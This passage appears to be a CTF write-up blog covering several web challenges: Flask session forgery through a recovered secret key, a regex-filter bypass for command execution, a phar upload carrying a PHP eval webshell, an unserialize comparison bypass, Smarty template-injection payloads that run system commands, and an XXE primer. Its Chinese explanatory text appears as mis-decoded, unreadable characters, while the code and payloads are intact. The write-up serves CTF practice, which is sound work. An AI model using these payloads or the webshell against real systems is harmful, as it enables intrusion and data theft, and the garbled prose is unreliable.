<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/%25%36%31%25%37%30%25%37%30%25%32%46%25%36%31%25%37%30%25%37%30%25%32%45%25%37%30%25%37%39</span><br></pre></td></tr></table></figure>

<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240722191557128.png" alt="image-20240722191557128"></p>
<p>è®¿é—®åå¾—åˆ°æºç </p>
<p><img src="https://gitee.com/zxydsg/yiyi_blog/raw/master/image-20240722191619330.png" alt="image-20240722191619330"></p>
<p>ç„¶åå°±æ˜¯ç†Ÿæ‚‰çš„sessionä¼ªé€ </p>
<p>é¦–å…ˆæ‰¾åˆ°secretç”Ÿæˆæ–¹å¼</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="built_in">str</span>(random.random() * <span class="number">233</span>)</span><br></pre></td></tr></table></figure>

<p>è¯»mac</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/etc/passwdç”¨æ¥åˆ¤æ–­è¯»å–æ¼æ´çš„å­˜åœ¨</span><br><span class="line">/etc/environmentæ˜¯ç¯å¢ƒå˜é‡é…ç½®æ–‡ä»¶ä¹‹ä¸€ã€‚ç¯å¢ƒå˜é‡å¯èƒ½å­˜åœ¨å¤§é‡ç›®å½•ä¿¡æ¯çš„æ³„éœ²ï¼Œç”šè‡³å¯èƒ½å‡ºç°secret keyæ³„éœ²çš„æƒ…å†µã€‚</span><br><span class="line">/etc/hostname/etc/hostnameè¡¨ç¤ºä¸»æœºåã€‚</span><br><span class="line">/etc/issueæŒ‡æ˜ç³»ç»Ÿç‰ˆæœ¬ã€‚</span><br><span class="line">/procç›®å½•</span><br><span class="line">/proc/[pid]æŸ¥çœ‹è¿›ç¨‹</span><br><span class="line">/proc/selfæŸ¥çœ‹å½“å‰è¿›ç¨‹</span><br><span class="line">/proc/self/cmdlineå½“å‰è¿›ç¨‹å¯¹åº”çš„ç»ˆç«¯å‘½ä»¤</span><br><span class="line">/proc/self/pwdç¨‹åºè¿è¡Œç›®å½•</span><br><span class="line">/proc/self/ç¯å¢ƒå˜é‡</span><br><span class="line">/sys/class/net/eth0/address macåœ°å€ä¿å­˜ä½</span><br></pre></td></tr></table></figure>

<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240722192346256.png" alt="image-20240722192346256"></p>
<p>ç”Ÿæˆsecret</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    random.seed(<span class="number">0x0242ac02a812</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">str</span>(random.random() * <span class="number">233</span>))</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">207.12851557558668</span><br></pre></td></tr></table></figure>

<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240722193916810.png" alt="image-20240722193916810"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python flask_session_cookie_manager3.py encode -t &quot;&#123;&#x27;passport&#x27;: &#x27;Welcome To HDCTF2023&#x27;&#125;&quot; -s  &quot;62.6539852098&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240722194312461.png" alt="image-20240722194312461"></p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240722195318126.png" alt="image-20240722195318126"></p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240722194615829.png" alt="image-20240722194615829"></p>
<p>ä¸Šä¼ åé€šè¿‡&#x2F;boogipopè·¯ç”±å»è®¿é—®å“åº”æ–‡ä»¶å³å¯</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28540/boogipop?file=uploads/1.txt</span><br></pre></td></tr></table></figure>

<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240722200622404.png" alt="image-20240722200622404"></p>
<h2 id="FBCTF-2019-rceservice-1"><a href="#FBCTF-2019-rceservice-1" class="headerlink" title="[FBCTF 2019]rceservice"></a>[FBCTF 2019]rceservice</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">putenv</span>(<span class="string">&#x27;PATH=/home/rceservice/jail&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$json</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="title function_ invoke__">is_string</span>(<span class="variable">$json</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/&#x27;</span>, <span class="variable">$json</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Attempting to run command:&lt;br/&gt;&#x27;</span>;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$json</span>, <span class="literal">true</span>)[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$cmd</span> !== <span class="literal">NULL</span>) &#123;</span><br><span class="line">      <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;Invalid input&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ä¸¤ä¸ªç‚¹</p>
<ul>
<li>preg_matchç»•è¿‡</li>
</ul>
<p>%0aæ¢è¡Œæ¥ç»•è¿‡ï¼Œpreg_matchåªèƒ½åŒ¹é…ç¬¬ä¸€è¡Œ</p>
<ul>
<li>catè¢«è¿‡æ»¤</li>
</ul>
<p>&#x2F;bin&#x2F;catè¿›è¡Œç»•è¿‡<br>å†ç”¨jsonçš„æ ¼å¼å°è£…èµ·æ¥</p>
<p>æœ€ç»ˆpayload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	%0a&quot;cmd&quot;:&quot;/bin/cat /home/rceservice/flag&quot;%0a</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="NISACTF-2022-bingdundun-1"><a href="#NISACTF-2022-bingdundun-1" class="headerlink" title="[NISACTF 2022]bingdundun~"></a>[NISACTF 2022]bingdundun~</h2><p>åŸºç¡€çš„pharååºåˆ—åŒ–</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$payload</span> = <span class="string">&#x27;&lt;?php eval($_POST[&quot;1&quot;]); ?&gt;&#x27;</span>; <span class="comment">//ä¸€å¥è¯æœ¨é©¬</span></span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;example.phar&quot;</span>); <span class="comment">//åç¼€åå¿…é¡»ä¸ºphar</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//è®¾ç½®stub</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;67.php&quot;</span>, <span class="string">&quot;<span class="subst">$payload</span>&quot;</span>); <span class="comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span></span><br><span class="line">    <span class="comment">// $phar-&gt;setMetadata(...); //åœ¨metadataæ·»åŠ å†…å®¹ï¼Œå¯å‚è€ƒ pharååºåˆ—åŒ–ï¼Œæ­¤å¤„ç”¨ä¸ç€ï¼Œæ•…æ³¨é‡Š</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240723110949181.png" alt="image-20240723110949181"></p>
<p>ä¸Šä¼ åç›´æ¥è®¿é—®å¯¹åº”çš„å‹ç¼©è¿›å»çš„phpå³å¯</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node5.anna.nssctf.cn:20355/?bingdundun=phar://0551e3d7f50fe9b53c54c885e264a5d1.zip/67</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zxydsg/yiyi_blog/raw/master/image-20240723111013991.png" alt="image-20240723111013991"></p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240723111109017.png" alt="image-20240723111109017"></p>
<p>67æ˜¯åˆ›å»ºçš„æ—¶å€™å‹ç¼©è¿›å»çš„ï¼Œè‡ªåŠ¨è¡¥å…¨åç¼€</p>
<p>pharä¼ªåè®®åªè®¤pharæ–‡ä»¶ç‰¹å¾ï¼ˆstubç­‰ï¼‰ï¼Œåç¼€æ˜¯ç»™äººçœ‹çš„ï¼Œå› æ­¤å¯ä»¥è§£æzip</p>
<h2 id="HUBUCTF-2022-æ–°ç”Ÿèµ›-checkin-1"><a href="#HUBUCTF-2022-æ–°ç”Ÿèµ›-checkin-1" class="headerlink" title="[HUBUCTF 2022 æ–°ç”Ÿèµ›]checkin"></a>[HUBUCTF 2022 æ–°ç”Ÿèµ›]checkin</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$username</span>  = <span class="string">&quot;this_is_secret&quot;</span>; </span><br><span class="line"><span class="variable">$password</span>  = <span class="string">&quot;this_is_not_known_to_you&quot;</span>; </span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);<span class="comment">//here I changed those two </span></span><br><span class="line"><span class="variable">$info</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;info&#x27;</span>])? <span class="variable">$_GET</span>[<span class="string">&#x27;info&#x27;</span>]: <span class="string">&quot;&quot;</span> ;</span><br><span class="line"><span class="variable">$data_unserialize</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$info</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$data_unserialize</span>[<span class="string">&#x27;username&#x27;</span>]==<span class="variable">$username</span>&amp;&amp;<span class="variable">$data_unserialize</span>[<span class="string">&#x27;password&#x27;</span>]==<span class="variable">$password</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;username or password error!&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è€ƒå¯Ÿä¸€ä¸ªç‚¹ï¼Œå¸ƒå°”ç±»å‹å’Œénullå€¼æ¯”è¾ƒéƒ½ç­‰äºtrue</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = [</span><br><span class="line">    <span class="string">&#x27;username&#x27;</span> =&gt; <span class="literal">true</span>,</span><br><span class="line">    <span class="string">&#x27;password&#x27;</span> =&gt; <span class="literal">true</span></span><br><span class="line">];</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>

<h2 id="HDCTF-2023-SearchMaster-1"><a href="#HDCTF-2023-SearchMaster-1" class="headerlink" title="[HDCTF 2023]SearchMaster"></a>[HDCTF 2023]SearchMaster</h2><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12220?time__1311=GqGxRDcGD=G==GN4eeqBKupUKGOA1Na4D">Smartyæ¨¡æ¿æ³¨å…¥&amp;CVE-2017-1000480 - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p>
<blockquote>
<h3 id="æ ‡ç­¾ï¼š-1"><a href="#æ ‡ç­¾ï¼š-1" class="headerlink" title="æ ‡ç­¾ï¼š"></a>æ ‡ç­¾ï¼š</h3><h4 id="1-smarty-version-1"><a href="#1-smarty-version-1" class="headerlink" title="1. {$smarty.version}"></a>1. <code>&#123;$smarty.version&#125;</code></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;$smarty.version&#125;  #è·å–smartyçš„ç‰ˆæœ¬å·</span><br></pre></td></tr></table></figure>

<h4 id="2-php-php-1"><a href="#2-php-php-1" class="headerlink" title="2.{php}{/php}"></a>2.<code>&#123;php&#125;&#123;/php&#125;</code></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;php&#125;phpinfo();&#123;/php&#125;  #æ‰§è¡Œç›¸åº”çš„phpä»£ç </span><br></pre></td></tr></table></figure>

<p>Smartyæ”¯æŒä½¿ç”¨ {php}{&#x2F;php} æ ‡ç­¾æ¥æ‰§è¡Œè¢«åŒ…è£¹å…¶ä¸­çš„phpæŒ‡ä»¤ï¼Œæœ€å¸¸è§„çš„æ€è·¯è‡ªç„¶æ˜¯å…ˆæµ‹è¯•è¯¥æ ‡ç­¾ã€‚ä½†å› ä¸ºåœ¨Smarty3ç‰ˆæœ¬ä¸­å·²ç»åºŸå¼ƒ{php}æ ‡ç­¾ï¼Œå¼ºçƒˆå»ºè®®ä¸è¦ä½¿ç”¨ã€‚åœ¨Smarty 3.1ï¼Œ{php}ä»…åœ¨SmartyBCä¸­å¯ç”¨ã€‚</p>
<h4 id="3-literal-1"><a href="#3-literal-1" class="headerlink" title="3.{literal}"></a>3.<code>&#123;literal&#125;</code></h4><ul>
<li>{literal} å¯ä»¥è®©ä¸€ä¸ªæ¨¡æ¿åŒºåŸŸçš„å­—ç¬¦åŸæ ·è¾“å‡ºã€‚è¿™ç»å¸¸ç”¨äºä¿æŠ¤é¡µé¢ä¸Šçš„Javascriptæˆ–cssæ ·å¼è¡¨ï¼Œé¿å…å› ä¸º Smarty çš„å®šç•Œç¬¦è€Œé”™è¢«è§£æã€‚</li>
<li>åœ¨ PHP5 ç¯å¢ƒä¸‹å­˜åœ¨ä¸€ç§ PHP æ ‡ç­¾ï¼Œ <code>&lt;script&gt;language=&quot;php&quot;&gt;&lt;/script&gt;ï¼Œ</code>æˆ‘ä»¬ä¾¿å¯ä»¥åˆ©ç”¨è¿™ä¸€æ ‡ç­¾è¿›è¡Œä»»æ„çš„ PHP ä»£ç æ‰§è¡Œã€‚</li>
<li>é€šè¿‡ä¸Šè¿°æè¿°ä¹Ÿå¯ä»¥æƒ³åˆ°ï¼Œæˆ‘ä»¬å®Œå…¨å¯ä»¥åˆ©ç”¨è¿™ä¸€ç§æ ‡ç­¾æ¥å®ç° XSS æ”»å‡»ï¼Œè¿™ä¸€ç§æ”»å‡»æ–¹å¼åœ¨ SSTI ä¸­ä¹Ÿæ˜¯å¾ˆå¸¸è§çš„ï¼Œå› ä¸ºåŸºæœ¬ä¸Šæ‰€æœ‰æ¨¡æ¿éƒ½ä¼šå› ä¸ºéœ€è¦æä¾›ç±»ä¼¼çš„åŠŸèƒ½ã€‚</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;literal&#125;alert(&#x27;xss&#x27;);&#123;/literal&#125;</span><br></pre></td></tr></table></figure>

<h4 id="4-if-if-1"><a href="#4-if-if-1" class="headerlink" title="4.{if}{/if}"></a>4.<code>&#123;if&#125;&#123;/if&#125;</code></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;if phpinfo()&#125;&#123;/if&#125;</span><br></pre></td></tr></table></figure>

<p>Smartyçš„ {if} æ¡ä»¶åˆ¤æ–­å’ŒPHPçš„iféå¸¸ç›¸ä¼¼ï¼Œåªæ˜¯å¢åŠ äº†ä¸€äº›ç‰¹æ€§ã€‚æ¯ä¸ª{if}å¿…é¡»æœ‰ä¸€ä¸ªé…å¯¹çš„{&#x2F;if}ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨{else} å’Œ {elseif}ï¼Œå…¨éƒ¨çš„PHPæ¡ä»¶è¡¨è¾¾å¼å’Œå‡½æ•°éƒ½å¯ä»¥åœ¨ifå†…ä½¿ç”¨ï¼Œå¦‚<code>||</code>ï¼Œ<code>or</code>ï¼Œ<code>&amp;&amp;</code>ï¼Œ<code>and</code>ï¼Œ<code>is_array()</code>ç­‰ç­‰ï¼Œå¦‚ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;if is_array($array)&#125;&#123;/if&#125;</span><br></pre></td></tr></table></figure>

<p>è¿˜å¯ä»¥ç”¨æ¥æ‰§è¡Œå‘½ä»¤ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;if phpinfo()&#125;&#123;/if&#125;</span><br><span class="line">&#123;if readfile (&#x27;/flag&#x27;)&#125;&#123;/if&#125;</span><br><span class="line">&#123;if show_source(&#x27;/flag&#x27;)&#125;&#123;/if&#125;</span><br><span class="line">&#123;if system(&#x27;cat /flag&#x27;)&#125;&#123;/if&#125;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>æ‰«æå‘ç°composer.jsonï¼Œè®¿é—®å‘ç°æ˜¯smartyæ¨¡æ¿</p>
<p><img src="https://gitee.com/zxydsg/yiyi_blog/raw/master/image-20240723141451626.png" alt="image-20240723141451626"></p>
<p>å°è¯•è¿›å…¥æ³¨ç‚¹ä¸œè¥¿</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240723142227510.png" alt="image-20240723142227510"></p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240723141901771.png" alt="image-20240723141901771"></p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240723142427767.png" alt="image-20240723142427767"></p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240723142444541.png" alt="image-20240723142444541"></p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240723142507129.png" alt="image-20240723142507129"></p>
<h2 id="NCTF-2019-Fake-XML-cookbook-1"><a href="#NCTF-2019-Fake-XML-cookbook-1" class="headerlink" title="[NCTF 2019]Fake XML cookbook"></a>[NCTF 2019]Fake XML cookbook</h2><p><strong>1.ä»€ä¹ˆæ˜¯xxeï¼Ÿ</strong></p>
<p>XXEæ¼æ´ï¼ˆXMLå¤–éƒ¨å®ä½“æ³¨å…¥ï¼‰æ˜¯ä¸€ç§å®‰å…¨æ¼æ´ï¼Œå¯ä»¥åˆ©ç”¨è¾“å…¥éªŒè¯ä¸ä¸¥æ ¼çš„ XML è§£æå™¨æ¥æ³¨å…¥æ¶æ„ä»£ç ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„çš„ XML <a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E6%96%87%E6%A1%A3&spm=1001.2101.3001.7020">æ–‡æ¡£</a>å°†å…¶å‘é€åˆ°åº”ç”¨ç¨‹åºä¸­ï¼Œåœ¨è§£æè¯¥æ–‡æ¡£æ—¶ï¼ŒXML è§£æå™¨ä¼šåŠ è½½å¤–éƒ¨å®ä½“ï¼ˆå¦‚æ–‡ä»¶ã€URLç­‰ï¼‰ï¼Œä»¥ä¾¿åœ¨æ–‡æ¡£ä¸­å¼•ç”¨å®ƒä»¬ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ä¸ªåŠŸèƒ½æ¥æ‰§è¡Œå„ç§æ”»å‡»ï¼Œä¾‹å¦‚è¯»å–æœåŠ¡å™¨ä¸Šçš„ä»»æ„æ–‡ä»¶ã€å‘é€å†…éƒ¨ç½‘ç»œè¯·æ±‚ã€ç»•è¿‡èº«ä»½éªŒè¯ç­‰ã€‚</p>
<p>æœ‰ç‚¹åƒSSRF</p>
<p>PHP é»˜è®¤ä½¿ç”¨ libxml æ¥è§£æ XMLï¼Œä½†æ˜¯ä» libxml 2.9.0 å¼€å§‹ï¼Œå®ƒé»˜è®¤ä¸å†è§£æå¤–éƒ¨å®ä½“ï¼Œå¯¼è‡´ PHP ä¸‹çš„ XXE æ¼æ´å·²ç»é€æ¸æ¶ˆå¤±ï¼Œé™¤éä½ æŒ‡å®š LIBLXML_NOENT å»å¼€å¯å¤–éƒ¨å®ä½“è§£æï¼Œæ‰ä¼šå­˜åœ¨ XXE æ¼æ´ã€‚æ›´å¤šå…¶å®æ˜¯javaæ¼æ´ï¼Œ<strong>å› ä¸º XXE åœ¨åˆ©ç”¨ä¸Šä¸è¯­è¨€æ— å…³ï¼Œæ— è®ºæ˜¯ phpã€java è¿˜æ˜¯ Cã€pythonï¼Œåˆ©ç”¨æŠ€å·§éƒ½æ˜¯ä¸€æ ·çš„ã€‚</strong></p>
<p><strong>2.ä»€ä¹ˆæ˜¯XML</strong></p>
<p>XMLï¼ˆExtensible Markup Languageï¼‰æ„ä¸ºå¯æ‰©å±•æ€§æ ‡è®°è¯­è¨€ï¼ŒXML æ–‡æ¡£ç»“æ„åŒ…æ‹¬ XML å£°æ˜ã€æ–‡æ¡£ç±»å‹å®šä¹‰(DTD)ã€æ–‡æ¡£å…ƒç´ ã€‚</p>
<p>å‚è€ƒä¾‹å­ï¼š</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--XMLå£°æ˜--&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span> </span><br><span class="line"><span class="comment">&lt;!--æ–‡æ¡£ç±»å‹å®šä¹‰--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">people</span> [  &lt;!--å®šä¹‰æ­¤æ–‡æ¡£æ˜¯ people ç±»å‹çš„æ–‡æ¡£--&gt;</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="keyword">people</span> (<span class="keyword">name</span>,<span class="keyword">age</span>,<span class="keyword">mail</span>)&gt;</span>  &lt;!--å®šä¹‰peopleå…ƒç´ æœ‰3ä¸ªå…ƒç´ --&gt;</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="keyword">name</span> (<span class="keyword">#PCDATA</span>)&gt;</span>     &lt;!--å®šä¹‰nameå…ƒç´ ä¸ºâ€œ#PCDATAâ€ç±»å‹--&gt;</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="keyword">age</span> (<span class="keyword">#PCDATA</span>)&gt;</span>   &lt;!--å®šä¹‰ageå…ƒç´ ä¸ºâ€œ#PCDATAâ€ç±»å‹--&gt;</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="keyword">mail</span> (<span class="keyword">#PCDATA</span>)&gt;</span>   &lt;!--å®šä¹‰mailå…ƒç´ ä¸ºâ€œ#PCDATAâ€ç±»å‹--&gt;</span></span><br><span class="line"><span class="meta">]]]&gt;</span></span><br><span class="line"><span class="comment">&lt;!--æ–‡æ¡£å…ƒç´ --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">people</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>john<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">age</span>&gt;</span>18<span class="tag">&lt;/<span class="name">age</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">mail</span>&gt;</span>john@qq.com<span class="tag">&lt;/<span class="name">mail</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">people</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>1.DTD å®ä½“å£°æ˜</strong></p>
<p>DTDï¼ˆDocument Type Definitionï¼Œæ–‡æ¡£ç±»å‹å®šä¹‰ï¼‰ç”¨äºå®šä¹‰ XML æ–‡æ¡£ç»“æ„ï¼ŒåŒ…æ‹¬å…ƒç´ çš„å®šä¹‰è§„åˆ™ã€å…ƒç´ é—´çš„å…³ç³»è§„åˆ™ã€å±æ€§çš„å®šä¹‰è§„åˆ™ï¼Œå…¶å®šä¹‰ç»“æ„å¦‚ä¸‹ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE æ ¹å…ƒç´  [å®šä¹‰å†…å®¹]&gt;</span><br></pre></td></tr></table></figure>

<p><strong>2.å†…éƒ¨å®ä½“å£°æ˜</strong></p>
<p>å†…éƒ¨å£°æ˜é‡‡ç”¨å¦‚ä¸‹æ ¼å¼å®šä¹‰ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY å®ä½“å &quot;å®ä½“å€¼&quot;&gt;</span><br></pre></td></tr></table></figure>

